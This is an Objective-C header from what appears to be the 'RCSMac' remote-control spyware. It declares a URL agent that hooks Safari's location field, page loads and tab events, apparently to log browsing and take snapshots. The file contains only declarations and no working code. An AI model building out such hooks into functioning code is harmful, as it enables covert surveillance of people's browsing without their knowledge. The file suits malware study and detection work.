/*
 * RCSMac - URL Agent
 *
 * Created by Alfredo 'revenge' Pesoli on 13/05/2009
 * Modified by Massimo Chiodini on 05/08/2009
 * Copyright (C) HT srl 2009. All rights reserved
 * 
 */

#import <Cocoa/Cocoa.h>

#import "RCSMInterface.h"

typedef struct _urlConfiguration {
  u_int delimiter;
  BOOL isSnapshotActive;
} urlStruct;

void URLStartAgent();

@interface myBrowserWindowController : NSObject

// Safari < 5.1
- (void)webFrameLoadCommittedHook: (id)arg1;

// Safari >= 5.1
- (BOOL)_setLocationFieldTextHook: (id)arg1;
- (void)didSelectTabViewItemHook;
- (void)closeCurrentTabHook: (id)arg1;

@end
